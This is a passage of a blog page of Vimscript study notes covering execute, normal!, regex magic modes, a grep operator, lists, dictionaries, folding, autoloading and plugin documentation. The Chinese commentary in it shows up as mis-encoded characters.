and Upper Case"></a>Lower and Upper Case</h3><pre><code class="hljs">echom tolower(â€œFooâ€)echom toupper(â€œFooâ€)</code></pre><hr><p>Read <code>:help split()</code><br>Read <code>:help join()</code><br>Read <code>:help functions</code></p><hr><h2 id="28-Execute"><a href="#28-Execute" class="headerlink" title="28 Execute"></a>28 Execute</h2><p>åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦æ˜¯Vimscriptçš„å‘½ä»¤ã€‚</p><h3 id="Basic-Excution"><a href="#Basic-Excution" class="headerlink" title="Basic Excution"></a>Basic Excution</h3><pre><code class="hljs">execute â€œechom â€˜Hello, world!â€™â€</code></pre><p>è¾“å‡º<code>â€™Hello world!â€™</code></p><p>Can not be followed by a comment.</p><hr><p>Read <code>:help execute</code></p><p>Read <code>:help leftabove</code>, <code>:help rightbelow</code>,<code>:help split</code>,<code>:help vsplit</code>.</p><hr><h2 id="29-Normal"><a href="#29-Normal" class="headerlink" title="29 Normal"></a>29 Normal</h2><pre><code class="hljs">normal G</code></pre><p>ç§»åŠ¨åˆ°æ–‡ä»¶åº•éƒ¨ã€‚</p><h3 id="Avoiding-Mapping"><a href="#Avoiding-Mapping" class="headerlink" title="Avoiding Mapping"></a>Avoiding Mapping</h3><p>ä½¿ç”¨<code>normal!</code>ç›¸å½“äºnorecuisionçš„ä½œç”¨ï¼Œåœ¨å†™Vimscriptçš„æ—¶å€™è¦ç”¨<code>normal!</code>ã€‚</p><h3 id="Special-Characters-1"><a href="#Special-Characters-1" class="headerlink" title="Special Characters"></a>Special Characters</h3><p><code>normal!</code>ä¸èƒ½è¯†åˆ«ç‰¹æ®Šå­—ç¬¦å¦‚<code>&lt;cr&gt;</code>å®ƒä¼šå°†å…¶è§†ä¸º<code>â€˜&lt;â€™ â€˜câ€™ â€™râ€™ â€™&gt;â€™</code>.</p><p><code>execute</code>å’Œ<code>normal!</code>ç»“åˆå¯ä»¥è§£å†³ä»¥ä¸Šé—®é¢˜ã€‚</p><pre><code class="hljs">:execute â€œnormal! gg/foo\&lt;cr&gt;ddâ€</code></pre><p>æ­¤å¤„è¦ä½¿ç”¨è½¬ä¹‰<code>\</code></p><hr><p>Read <code>:help normal</code></p><hr><h3 id="Extra-Credit"><a href="#Extra-Credit" class="headerlink" title="Extra Credit"></a>Extra Credit</h3><p>Skip æ‰äº†</p><h2 id="30-Execute-Normal"><a href="#30-Execute-Normal" class="headerlink" title="30 Execute Normal!"></a>30 Execute Normal!</h2><p>Read <code>:help express-quote</code></p><h2 id="31-Basic-Regular-Expressions"><a href="#31-Basic-Regular-Expressions" class="headerlink" title="31 Basic Regular Expressions"></a>31 Basic Regular Expressions</h2><p>Use <code>?</code> to search backward instead of forward.</p><pre><code class="hljs">execute â€œnormal! G?print\&lt;cr&gt;â€</code></pre><p>ä¹Ÿå°±æ˜¯è¯´<code>/</code>æ˜¯ä»¥forwardçš„æ–¹å¼æŸ¥æ‰¾ï¼Œ<code>?</code>æ˜¯ä»¥backwardçš„æ–¹å¼æŸ¥æ‰¾ã€‚</p><h3 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h3><p><code>magic</code>é€‰é¡¹å°±æ˜¯å­˜åœ¨<code>\n</code>è¿™ç±»æ™®é€šå­—ç¬¦å‰é¢åŠ ä¸€ä¸ª<code>\</code>å°±æœ‰äº†ç‰¹æ®Šå«ä¹‰ï¼Œä»¥åŠ<code>\.</code>å°†åŸæœ¬æœ‰ç‰¹æ®Šå«ä¹‰çš„è¯å˜ä¸ºæ™®é€šçš„å­—ç¬¦ã€‚</p><pre><code class="hljs">execute â€œnormal! gg/for .\\+ in .\\+:\&lt;cr&gt;â€</code></pre><p>æ­¤å¤„çš„æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„<code>+</code>éœ€å†™æˆ<code>\+</code>æ‰èƒ½å‘æŒ¥ä½œç”¨ï¼Œæ‰€ä»¥<code>\\</code>æ˜¯ä¸ºäº†è½¬ä¹‰ä¸€ä¸ª<code>\</code>.</p><p>åœ¨Vimä¸­ï¼Œå•å¼•å·é˜”èµ·æ¥çš„éƒ½è¡¨ç¤ºå•ä¸ªå­—ç¬¦å¦‚<code>a\nb</code>ï¼Œè¡¨ç¤ºå››ä¸ªå­—ç¬¦ã€‚</p><pre><code class="hljs">:execute â€œnormal! ggâ€ . â€˜/for .\+ in .\+:â€™ . â€œ\&lt;cr&gt;â€</code></pre><h3 id="Very-Magic"><a href="#Very-Magic" class="headerlink" title="Very Magic"></a>Very Magic</h3><p>Very magicå°±æ˜¯ï¼šæ‰€æœ‰çš„ASCIIå­—ç¬¦é™¤äº† â€˜0â€™-â€˜9â€™ï¼Œ â€˜aâ€™-â€˜zâ€™ï¼Œâ€˜Aâ€™-â€˜Zâ€™å’Œâ€˜_â€™å¤–çš„å­—ç¬¦éƒ½æœ‰ç‰¹æ®Šå«ä¹‰ã€‚</p><p>Vim æœ‰å››ç§parse regexçš„æ–¹æ³•ï¼Œæ·»åŠ <code>\v</code>èƒ½å¤Ÿè®©è¿™ç§regexè¯­æ³•æœ€æ¥è¿‘å…¶ä»–è¯­è¨€ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼, <code>\v</code>æ˜¯â€very magicâ€œæ¨¡å¼ã€‚</p><pre><code class="hljs">â€˜/\vfor .+ in .+:â€™</code></pre><hr><p>Read <code>:help magic</code><br>Read <code>:help pattern-overview</code><br>Read <code>:help match</code><br>Read <code>:help nohlsearch</code></p><hr><h2 id="32-Case-Study-Grep-Operator-Part-One"><a href="#32-Case-Study-Grep-Operator-Part-One" class="headerlink" title="32 Case Study: Grep Operator, Part One"></a>32 Case Study: Grep Operator, Part One</h2><hr><p>Read <code>:help grep</code><br>Read <code>:help make</code><br>Read <code>:help quickfix-window</code></p><hr><h3 id="Escaping-Shell-Command-Arguments"><a href="#Escaping-Shell-Command-Arguments" class="headerlink" title="Escaping Shell Command Arguments"></a>Escaping Shell Command Arguments</h3><p><code>&lt;cword&gt;</code>ç”¨åœ¨å‘½ä»¤ä¸­ï¼ŒVimä¼šåœ¨å‘½ä»¤è¢«æ‰§è¡Œå‰æŠŠå®ƒæ›¿æ¢ä¸ºå…‰æ ‡ä¸‹çš„å•è¯ã€‚</p><p><code>&lt;cWORD&gt;</code>ä¼šæ›¿æ¢ä¸ºæ•´ä¸ªå•è¯ã€‚</p><p>ä¸¤ä¸ªçš„åŒºåˆ«åœ¨å¦‚foo-bar, å‰è€…ä¼šæ›¿æ¢ä¸ºfooï¼Œåè€…ä¼šæ›¿æ¢ä¸ºfoo-bar.</p><p>Vimä¼šåœ¨å¦‚<code>&lt;cword&gt;</code>æ‰©å±•ä¹‹å‰å°±è¿è¡Œshellescape()ï¼Œå› æ­¤è¦ä½¿ç”¨expand(), è®©<code>&lt;cword&gt;</code>åœ¨shellescape()æ‰§è¡Œä¹‹å‰å±•å¼€ã€‚</p><pre><code class="hljs">:nnoremap &lt;leader&gt;g :execute â€œgrepï¼ -R â€ . shellescape(expand(â€œ&lt;cWORD&gt;â€)) . â€œ .â€&lt;cr&gt;:copen&lt;cr&gt;</code></pre><p><code>grep!</code>é˜²æ­¢è·³è½¬è‡³ç¬¬ä¸€æ¡ã€‚</p><p><code>copen</code>çš„ä½œç”¨æ˜¯æ‰“å¼€quickfixï¼Œå¯è°ƒæ•´é«˜åº¦ã€‚</p><p><code>cnext</code>æ˜¯åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªerrorçš„ä½ç½®ã€‚</p><p><code>cprevious</code>æ˜¯åˆ‡æ¢åˆ°å‰ä¸€ä¸ªã€‚</p><hr><p>Read <code>:help :grep</code><br>Read <code>:help cword</code><br>Read <code>:help cnext</code><br>Read <code>:help cprevious</code><br>Read <code>:help expand</code><br>Read <code>:help copen</code><br>Read <code>:help silent</code></p><hr><h2 id="33-Case-Study-Grep-Operator-Part-Two"><a href="#33-Case-Study-Grep-Operator-Part-Two" class="headerlink" title="33 Case Study: Grep Operator, Part Two"></a>33 Case Study: Grep Operator, Part Two</h2><p><code>ï½/vim/plugin</code>ç›®å½•ï¼Œæ“ä½œå…¶ä¸­çš„æ–‡ä»¶æ—¶å¯ä»¥ç”¨<code>:source %</code>åŠ è½½ã€‚</p><hr><h3 id="Visual-Mode"><a href="#Visual-Mode" class="headerlink" title="Visual Mode"></a>Visual Mode</h3><p><code>&lt;c-u&gt;</code>çš„ä½œç”¨ï¼Œé¿å…å‡ºç°<code>:â€™&lt;,â€™&gt;</code>.</p><p><code>visualmode()</code>è¿”å›visualmodeçš„æ¨¡å¼ã€‚</p><p>å˜é‡ç”±<code>@</code>å¼€å¤´çš„éƒ½æ˜¯å¯„å­˜å™¨ã€‚</p><p><code>@@</code>æ˜¯æœªå‘½åçš„å¯„å­˜å™¨ï¼Œå­˜æ”¾å¤åˆ¶å’Œåˆ é™¤çš„text(æœªæŒ‡å®šå¯„å­˜å™¨çš„)ã€‚</p><p><code>function!</code>å‰é¢çš„<code>!</code>è¡¨ç¤ºé‡å†™ä¸€ä¸ªfunctionã€‚</p><hr><p>Read <code>:help visulmode</code><br>Read <code>:help c_ctrl-u</code><br>Read <code>:help operatorfunc</code><br>Read <code>:help map-operator</code></p><hr><p><code>operatorfunc</code>æ˜¯ä¸ªé€‰é¡¹ï¼Œå¦‚</p><pre><code class="hljs">:set operatorfunc=GrepOperator</code></pre><p>è¿™æ ·ï¼Œå°±å¯ä»¥ç”¨<code>g@</code>æ¥è°ƒç”¨GrepOperatorè¿™ä¸ªå‡½æ•°ã€‚</p><p>â€˜&#96;[â€˜æ”¾åœ¨å®šä¹‰ä¸ºmotionçš„textå‰é¢.</p><hr><h2 id="34-Case-Study-Grep-Operator-Part-Three"><a href="#34-Case-Study-Grep-Operator-Part-Three" class="headerlink" title="34 Case Study: Grep Operator, Part Three"></a>34 Case Study: Grep Operator, Part Three</h2><hr><h3 id="Namespacing"><a href="#Namespacing" class="headerlink" title="Namespacing"></a>Namespacing</h3><p><SID>, ä¼šè¢«æ‰©å±•ä¸º<code>&lt;SNR&gt;num</code>numè¡¨ç¤ºä¸€ä¸ªç‰¹æ®Šçš„æ•°å­—ã€‚</p><p><code>s:</code>æ·»åŠ åˆ°å‡½æ•°å‰ï¼Œä½¿ä¹‹å¤„äºå½“å‰çš„åç§°ç©ºé—´ã€‚</p><hr><p>Read <code>:help &lt;SID&gt;</code></p><hr><h2 id="35-Lists"><a href="#35-Lists" class="headerlink" title="35 Lists"></a>35 Lists</h2><h3 id="indexing"><a href="#indexing" class="headerlink" title="indexing"></a>indexing</h3><p><code>0</code>è¡¨ç¤ºç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p><code>-1</code>è¡¨ç¤ºå€’æ•°ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œ<code>-2</code>è¡¨ç¤ºå€’æ•°ç¬¬äºŒä¸ªå…ƒç´ ã€‚</p><hr><h3 id="slicing"><a href="#slicing" class="headerlink" title="slicing"></a>slicing</h3><p>åˆ†å‰²ã€‚</p><pre><code class="hljs">:echo [â€˜aâ€™, â€˜bâ€™, â€˜câ€™, â€˜dâ€™, â€˜eâ€™][0:2]</code></pre><p>æ˜¾ç¤º<code>[â€™aâ€™, â€˜bâ€™ , â€˜câ€™]</code> </p><hr><h3 id="Concatenation-1"><a href="#Concatenation-1" class="headerlink" title="Concatenation"></a>Concatenation</h3><pre><code class="hljs">:echo [â€˜aâ€™, â€™bâ€™] + [â€˜câ€™]</code></pre><hr><h3 id="List-Function"><a href="#List-Function" class="headerlink" title="List Function"></a>List Function</h3><p>Read <code>:help List</code><br>Read <code>:help add()</code><br>Read <code>:help len()</code><br>Read <code>:help get()</code><br>Read <code>:help index()</code><br>Read <code>:help join()</code><br>Read <code>:help reverse()</code><br>Read <code>:help functions</code></p><hr><h2 id="36-Looping"><a href="#36-Looping" class="headerlink" title="36 Looping"></a>36 Looping</h2><h3 id="For-Loops"><a href="#For-Loops" class="headerlink" title="For Loops"></a>For Loops</h3><pre><code class="hljs">:let c = 0:for i in [1, ,2 ,3, 4]:  let c += i:endfor:echo c</code></pre><hr><h3 id="While-Loops"><a href="#While-Loops" class="headerlink" title="While Loops"></a>While Loops</h3><pre><code class="hljs">:let c = 1:let total = 0:while c &lt;= 4:  let total += c:  let c += 1:endwhile:echom total</code></pre><hr><p>Read <code>:help for</code><br>Read <code>:help while</code></p><hr><h2 id="Dictionaries"><a href="#Dictionaries" class="headerlink" title="Dictionaries"></a>Dictionaries</h2><pre><code class="hljs">:echo &#123;â€˜aâ€™: 1, 100: â€˜fooâ€™&#125;:echo &#123;â€˜aâ€™: 1, 100: â€˜fooâ€™,&#125;</code></pre><hr><h3 id="Indexing"><a href="#Indexing" class="headerlink" title="Indexing"></a>Indexing</h3><pre><code class="hljs">:echo &#123;â€˜aâ€™: 1, 100: â€˜fooâ€™,&#125;[â€˜aâ€™]:echo &#123;â€˜aâ€™: 1, 100: â€˜fooâ€™,&#125;.a</code></pre><hr><h3 id="Assigning-and-Adding"><a href="#Assigning-and-Adding" class="headerlink" title="Assigning and Adding"></a>Assigning and Adding</h3><pre><code class="hljs">:let foo = &#123;â€˜aâ€™: 1&#125;:let foo.a = 100:let foo.b = 200:echo foo</code></pre><hr><h3 id="Removing-Entries"><a href="#Removing-Entries" class="headerlink" title="Removing Entries"></a>Removing Entries</h3><pre><code class="hljs">:let test = remove(foo, â€˜aâ€™):unlet foo.b:echo foo:echo test</code></pre><p>å¤šæ•°ä½¿ç”¨<code>remove()</code></p><hr><h3 id="Dictionary-Function"><a href="#Dictionary-Function" class="headerlink" title="Dictionary Function"></a>Dictionary Function</h3><p>Read <code>:help Dictionary</code><br>Read <code>:help get()</code><br>Read <code>:help has_key()</code><br>Read <code>:help items()</code><br>Read <code>:help keys()</code><br>Read <code>:help values()</code></p><hr><h2 id="38-Toggling"><a href="#38-Toggling" class="headerlink" title="38 Toggling"></a>38 Toggling</h2><h3 id="Restoring-Windows-x2F-Buffers"><a href="#Restoring-Windows-x2F-Buffers" class="headerlink" title="Restoring Windows&#x2F;Buffers"></a>Restoring Windows&#x2F;Buffers</h3><p>æ¯ä¸€ä¸ªwindowéƒ½æœ‰ä¸€ä¸ªå·ã€‚</p><hr><p>Read <code>:help foldcolumn</code><br>Read <code>:help winnr()</code><br>Read <code>:help ctrl-w_w</code><br>Read <code>:help wincmd</code></p><hr><pre><code class="hljs">execute a:number . â€œwincmd operatorâ€</code></pre><hr><h3 id="Functional-Programming"><a href="#Functional-Programming" class="headerlink" title="Functional Programming"></a>Functional Programming</h3><hr><h3 id="Functions-as-Variables"><a href="#Functions-as-Variables" class="headerlink" title="Functions as Variables"></a>Functions as Variables</h3><p>å¯ä»¥ç”¨å˜é‡å­˜å‚¨å‡½æ•°ï¼Œè¿™æ—¶å˜é‡è¦ä»¥å¤§å†™å­—æ¯å¼€å¤´</p><pre><code class="hljs">:let Myfunc = function(â€œAppendâ€):echo Myfunc([1, 2], 3)</code></pre><hr><h3 id="Higher-Order-Function"><a href="#Higher-Order-Function" class="headerlink" title="Higher-Order Function"></a>Higher-Order Function</h3><p>å°±æ˜¯é€šè¿‡è°ƒç”¨å…¶ä»–å‡½æ•°å®Œæˆä»»åŠ¡çš„å‡½æ•°ã€‚</p><p>Read <code>:help map</code><br>Read <code>:help sort()</code><br>Read <code>:help reverse()</code><br>Read <code>:help copy()</code><br>Read <code>:help deepcopy()</code><br>Read <code>:help function()</code><br>Read <code>:help type()</code></p><hr><h2 id="40-Paths-1"><a href="#40-Paths-1" class="headerlink" title="40 Paths"></a>40 Paths</h2><p><code>%</code> è¡¨ç¤ºå½“å‰æ–‡ä»¶ã€‚</p><p><code>%:p</code>è¡¨ç¤ºç»å¯¹è·¯å¾„ã€‚</p><p>Read <code>:help expand()</code><br>Read <code>:help fnamemodify()</code><br>Read <code>:help filename-modifiers</code><br>Read <code>:help simplify</code><br>Read <code>:help resolve()</code><br>Read <code>:help globpath()</code><br>Read <code>:help wildcards</code></p><hr><h2 id="41-Creating-a-Full-Plugin"><a href="#41-Creating-a-Full-Plugin" class="headerlink" title="41 Creating a Full Plugin"></a>41 Creating a Full Plugin</h2><hr><h2 id="42-Plugin-Layout-in-the-Dark-Ages"><a href="#42-Plugin-Layout-in-the-Dark-Ages" class="headerlink" title="42 Plugin Layout in the Dark Ages"></a>42 Plugin Layout in the Dark Ages</h2><hr><h2 id="43-A-New-Hope-Plugin-Layout-with-Pathogen"><a href="#43-A-New-Hope-Plugin-Layout-with-Pathogen" class="headerlink" title="43 A New Hope: Plugin Layout with Pathogen"></a>43 A New Hope: Plugin Layout with Pathogen</h2><hr><h2 id="45-Basic-Syntax-Highlighting"><a href="#45-Basic-Syntax-Highlighting" class="headerlink" title="45 Basic Syntax Highlighting"></a>45 Basic Syntax Highlighting</h2><p>æ³¨æ„é˜²æ­¢é‡å¤åŠ è½½çš„åˆ¤æ–­ï¼Œå’Œé˜²æ­¢å¤šæ¬¡åŠ è½½å¤´æ–‡ä»¶ä¸€æ ·ã€‚</p><hr><p>Read <code>:help syn-keyword</code><br>Read <code>:help iskeyword</code><br>Read <code>:help group-name</code></p><hr><p>syn-keywordä¸­çš„option, å°±æ˜¯å¯ä»¥ç”¨ç®€å†™ã€‚</p><p>æŠŠä½ è‡ªå·±çš„group link åˆ°å…¶ä»–çš„groupï¼Œå°±å¯ä»¥æœ‰ä¸€æ ·çš„highlightingã€‚å¤§å°å†™ä¸æ•æ„Ÿã€‚</p><hr><h2 id="46-Advanced-Syntax-Highlighting"><a href="#46-Advanced-Syntax-Highlighting" class="headerlink" title="46 Advanced Syntax Highlighting"></a>46 Advanced Syntax Highlighting</h2><p><code>syntax keyword</code>çš„ä½œç”¨å¤§æ¦‚æ˜¯è‡ªå·±å®šä¹‰ä¸€ä¸ªkeyword groupã€‚</p><p><code>syntax match</code>åŒæ ·è¦è‡ªå·±å®šä¹‰ä¸€ä¸ªgroupï¼Œåªä¸è¿‡åé¢è·Ÿçš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼ã€‚å…¶ä¸å…è®¸ä¸€è¡Œå¤šä¸ªgroupã€‚</p><p>åå®šä¹‰çš„groupæœ‰æ›´é«˜çš„ä¼˜å…ˆçº§ã€‚</p><p>Keywordçš„ä¼˜å…ˆçº§é«˜äºMatchå’ŒRegion.</p><p>å¦‚ï¼š</p><pre><code class="hljs">syntax match potionComment â€œ\v#.*$â€</code></pre><hr><p>Read <code>:help syn-match</code><br>Read <code>:help syn-priority</code></p><hr><h2 id="47-Even-More-Advanced-Syntax-Highlighting"><a href="#47-Even-More-Advanced-Syntax-Highlighting" class="headerlink" title="47 Even More Advanced Syntax Highlighting"></a>47 Even More Advanced Syntax Highlighting</h2><p>Read <code>:help syntax</code></p><hr><h3 id="Highlighting-Strings"><a href="#Highlighting-Strings" class="headerlink" title="Highlighting Strings"></a>Highlighting Strings</h3><p>ç”¨<code>syntax region</code>, æ³¨æ„<code>start</code>,<code>skip</code>,<code>end</code></p><p>Read <code>:help syn-region</code></p><hr><h2 id="48-Basic-Folding"><a href="#48-Basic-Folding" class="headerlink" title="48 Basic Folding"></a>48 Basic Folding</h2><p>Read <code>:help usr_28</code></p><hr><p>æ‰€æœ‰çš„foldæ“ä½œä»¥<code>z</code>å¼€å¤´ã€‚</p><p>ä¿å­˜foldï¼Œ<code>mkview</code> å’Œ <code>loadview</code>.</p><p>ç”¨<code>viewdir</code> é€‰é¡¹æŸ¥çœ‹ã€‚</p><p>æŒ‰ç…§ç¼©è¿›fold<code>set foldmethod=indent</code></p><p><code>foldlevel</code>å’Œ<code>shiftwidth</code>ç›¸å…³ã€‚</p><p>åˆ©ç”¨<code>foldmethod</code>é€‰æ‹©æŠ˜å æ–¹å¼ã€‚</p><hr><p><mark>Vimä¸­localå’Œå…¨å±€çš„ä½œç”¨ã€‚</mark></p><p>è®¾ç½®äº†localä¹‹åï¼Œä¼šæ›´åŠ specificï¼Œå› æ­¤ä¼˜å…ˆçº§ä¼šæ›´é«˜ã€‚</p><hr><p>Read <code>:help foldmethod</code><br>Read <code>:help fold-manual</code><br>Read <code>:help fold-marker</code><br>Read <code>:help help foldmarkr</code><br>Read <code>:help fold-indent</code><br>Read <code>:help fdl</code><br>Read <code>:help foldlevelstart</code><br>Read <code>:help foldminlines</code><br>Read <code>:help foldignore</code></p><hr><h2 id="49-Advanced-Folding"><a href="#49-Advanced-Folding" class="headerlink" title="49 Advanced Folding"></a>49 Advanced Folding</h2><h3 id="Folding-Theory"><a href="#Folding-Theory" class="headerlink" title="Folding Theory"></a>Folding Theory</h3><p>æ¯ä¸€è¡Œä»£ç éƒ½æœ‰ä¸€ä¸ª<code>foldlevel</code>.</p><p>å½“å‰è‡ªå·±çš„ç†è§£ï¼Œä¸€ä¸ªtabé”®çš„ç¼©è¿›å°±æ˜¯è®©foldlevelåŠ 1ï¼Œfold indentæ˜¯æŒ‰ç…§æ¯ä¸€è¡Œçš„foldlevelæŠ˜å çš„ï¼Œç›¸é‚»çš„æŠ˜åœ¨ä¸€èµ·ï¼Œä½†ç›¸é‚»çš„foldlevelä¸ä¸€å®šç›¸ç­‰ã€‚</p><hr><h3 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>æ¯å½“<code>:set filetype=potion</code>æ—¶ï¼Œéƒ½ä¼šåŠ è½½<code>ftplugin/potion</code>.</p><hr><h3 id="Expr-Folding"><a href="#Expr-Folding" class="headerlink" title="Expr Folding"></a>Expr Folding</h3><p><code>foldignore</code>åªå¯¹<code>foldmethod</code>ä¸ºindentæ—¶æœ‰æ•ˆã€‚</p><p>å­—ç¬¦<code>â€™-1â€™</code>è¡¨ç¤ºè¿™ä¸€è¡Œçš„foldlevelæ˜¯<code>undefined</code>, è¿™ä¸€è¡Œçš„foldlevelä¼šå’Œthe line above or belowå“ªä¸€ä¸ªçš„foldlevelå°ï¼Œå°±ç­‰äºå“ªä¸€ä¸ªã€‚</p><hr><p>Read <code>:help foldexpr</code><br>Read <code>:help fold-expr</code><br>Read <code>:help getline</code><br>Read <code>:help indent()</code><br>Read <code>:help line()</code></p><hr><h3 id="An-Indentation-Level-Helper"><a href="#An-Indentation-Level-Helper" class="headerlink" title="An Indentation Level Helper"></a>An Indentation Level Helper</h3><p><code>shiftwidth</code>çš„å€¼å°±æ˜¯ä¸€ä¸ª<code>tab</code>é”®çš„é•¿åº¦ã€‚<code>tabstop</code>çš„å€¼ä¹Ÿæ˜¯<code>tab</code>çš„ç©ºæ ¼æ•°ã€‚</p><p><code>indent()</code>è¿”å›æŸä¸€è¡Œçš„å‰é¢çš„spaceæ•°ã€‚</p><p><code>=ï½ï¼Ÿ</code>çš„æ„æ€æ˜¯åé¢ä¸ºæ­£åˆ™è¡¨è¾¾å¼ä¸”å¤§å°å†™ä¸æ•æ„Ÿã€‚</p><p><code>&gt;</code>è¡¨ç¤ºå¦ä¸€ä¸ªVimä¸­çš„ç‰¹æ®Š<code>foldlevel</code>, å¦‚<code>&gt;1</code>å‘Šè¯‰Vimä»¥1ä»è¿™ä¸ªfoldlevelæ‰“å¼€å½“å‰è¡Œã€‚è®°å¿†æ–¹æ³•ï¼Œä»å·¦åˆ°å³å¯ä»¥è¿›å»ï¼Œæ‰€ä»¥æ˜¯ä»è¿™é‡Œå¼€å§‹æ‰“å¼€ã€‚</p><hr><p><mark>å¯¹foldçš„ç†è§£</mark><br>è¿™ä¸ªç©æ„å°±æ˜¯é foldlevelæ¥foldï¼Œæ¯”å¦‚çš„<code>foldmethod=indent</code>æ—¶ï¼Œæ­¤æ—¶çš„foldlevelå–å†³äºindentæ•°é‡ã€‚</p><p>å½“<code>foldmethod=expr</code>æ—¶ï¼Œæ­¤æ—¶çš„foldlevelå–å†³äºåé¢è¡¨è¾¾å¼çš„å€¼ï¼Œåé¢çš„è¿”å›å€¼ä¹Ÿæ˜¯æ•°å­—ï¼Œæ¥è¡¨ç¤ºfoldlevelï¼Œè¿™ä¸ª<code>foldexpr=</code>åé¢ä¸€ä¸ªä¸œè¥¿ä¼šå¯¹æ¯ä¸€è¡Œè®¡ç®—ï¼Œæœ€ç»ˆä¼šç®—å‡ºæ¯ä¸€è¡Œçš„foldlevelã€‚æ‰€ä»¥å½“æˆ‘ä¹‹å‰è®¾ç½®<code>:set foldexpr=1</code>çš„æ—¶å€™ä¼šå…¨éƒ¨æŠ˜å ï¼Œå…¶å®ä¸ç®¡æˆ‘åé¢å†™å¤šå°‘éƒ½ä¼šå…¨éƒ¨æŠ˜å ï¼Œå› ä¸ºè¿™æ ·å†™ç›¸å½“äºæˆ‘æŠŠæ¯ä¸€è¡Œçš„foldleveléƒ½è®¾ç½®ä¸ºäº†1.</p><p>è¿™ä¸‹å­<mark>foldçš„åŸåˆ™</mark>å°±é€šé€äº†ï¼š</p><ol><li>æ¯ä¸€è¡Œéƒ½æœ‰ä¸€ä¸ªfoldlevelã€‚</li><li>foldlevelä¸º0åˆ™ä¸ä¼šæŠ˜å ã€‚</li><li>ç›¸é‚»çš„è¡Œè‹¥æœ‰ç›¸åŒçš„foldlevelåˆ™æŠ˜å åœ¨ä¸€èµ·ã€‚</li><li>å½“ä¸€ä¸ªfoldlevelå¦‚1æŠ˜å æ—¶ï¼Œéšåçš„è¡Œä¸­è‹¥foldlevelé«˜äº1ä¹Ÿä¼šæŠ˜å ï¼Œç›´åˆ°ä¸€ä¸ªä½äº1çš„ã€‚</li></ol><p><mark>å¯¹<code>foldexpr</code>çš„ç†è§£</mark><br>foldexprå¾—åˆ°ä¸€ä¸ªå€¼ï¼Œè¿›è€Œåˆ¤æ–­è¿™ä¸€è¡Œæ˜¯å¦ä¸ºfoldã€‚</p><hr><h2 id="50-Section-Movement-Theory"><a href="#50-Section-Movement-Theory" class="headerlink" title="50 Section Movement Theory"></a>50 Section Movement Theory</h2><p>Read <code>:help section</code></p><hr><h3 id="Nroff"><a href="#Nroff" class="headerlink" title="Nroff"></a>Nroff</h3><p>nroffå’Œtrofféƒ½èµ·æºäºroffï¼Œæ˜¯ä¸€ç§ç±»ä¼¼äºLaTexå’ŒMarkdownçš„è¯­è¨€ï¼Œç”¨äºUNIXå’ŒUNIX-likeæ“ä½œç³»ç»Ÿï¼Œæ˜¯man pageçš„æ’ç‰ˆæ ¼å¼ã€‚</p><p>.SHæ˜¯section heading.</p><hr><p><code>[[</code>å’Œ<code>]]</code>ç”¨äºæ‰¾<code>&#123;</code>.</p><p><code>[]</code>å’Œ<code>][</code>ç”¨äºæ‰¾<code>&#125;</code>.</p><hr><h2 id="51-Potion-Section-Movement"><a href="#51-Potion-Section-Movement" class="headerlink" title="51 Potion Section Movement"></a>51 Potion Section Movement</h2><p>Read <code>:help line-continuation</code></p><p><mark><SID></mark><br>é¦–å…ˆï¼Œ<code>&lt;SID&gt;</code>åœ¨è„šæœ¬è¿è¡Œæ—¶ä¼šè¢«æ‰©å±•ä¸º<code>&lt;SNR&gt;12_</code>ï¼Œ12æ˜¯æˆ‘éšä¾¿å†™çš„æ•°å­—ï¼Œæ‰€ä»¥å¯ä»¥æŠŠ<SID>è§†ä¸ºä¸‹é¢çš„ç®€å†™å½¢å¼ï¼Œè¿™ä¸ªæ•°å­—æ˜¯ç”¨äºæ ‡è®°å½“å‰è„šæœ¬çš„unique numberã€‚</p><p>å®ƒè§£å†³äº†ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨Vimä¸­ï¼Œä½ è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒä¸çŸ¥é“å…¶åœ¨å“ªé‡Œå®šä¹‰çš„ï¼Œ<SID>èƒ½è®©Vimæ‰¾åˆ°å®ƒçš„å®šä¹‰ã€‚</p><hr><h3 id="Base-Movement"><a href="#Base-Movement" class="headerlink" title="Base Movement"></a>Base Movement</h3><p><code>%^</code> a special Vim regent atom that means â€œbeginning of fileâ€</p><p>Read <code>:help search()</code><br>Read <code>:help ordinary-atom</code></p><hr><h2 id="52-External-Commands"><a href="#52-External-Commands" class="headerlink" title="52 External Commands"></a>52 External Commands</h2><p><code>silent</code>ç†è§£<br>å°±æ˜¯å±è”½æ‰è¾“å‡ºçš„æŠ¥å‘Šä¿¡æ¯ï¼Œå°±æ˜¯å›åˆ°å‘½ä»¤è¡Œç•Œé¢ï¼Œç„¶åè¯´press enter to returnçš„é‚£ç§ã€‚</p><hr><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>The system() function takes a command string as a parameter and returns the output of that command as a String.</p><p>Read <code>:help bufname</code><br>Read <code>:help bufbyte</code><br>Read <code>:help append()</code><br>Read <code>:help split()</code><br>Read <code>:help :!</code><br>Read <code>:help read</code><br>Read <code>:help read!</code><br>Read <code>:help system()</code><br>Read <code>:help design-not</code><br>Read <code>:help bufwinnr()</code></p><hr><h2 id="53-Autoloading"><a href="#53-Autoloading" class="headerlink" title="53 Autoloading"></a>53 Autoloading</h2><p>å¦‚ï¼š</p><pre><code class="hljs">call somefile#Hello()</code></pre><p>åˆ™Vimä¼šå¯»æ‰¾<code>~/.vim/autoload/somefile.vim</code>æ–‡ä»¶</p><p>Read <code>:help autoload</code><br>Read <code>:help silent!</code></p><hr><h2 id="54-Documentation"><a href="#54-Documentation" class="headerlink" title="54 Documentation"></a>54 Documentation</h2><p>é€šè¿‡filetypeå¯ä»¥åšå¾ˆå¤šäº‹ï¼Œæ¯”å¦‚<code>:set filetype=help</code>èƒ½å¤Ÿä½¿ç”¨helpæ–‡æ¡£çš„é«˜äº®ã€‚</p><p>Read <code>:help help-writing</code><br>Read <code>:help :left</code><br>Read <code>:help :right</code><br>Read <code>:help :center</code></p><hr><h2 id="55-Distribution"><a href="#55-Distribution" 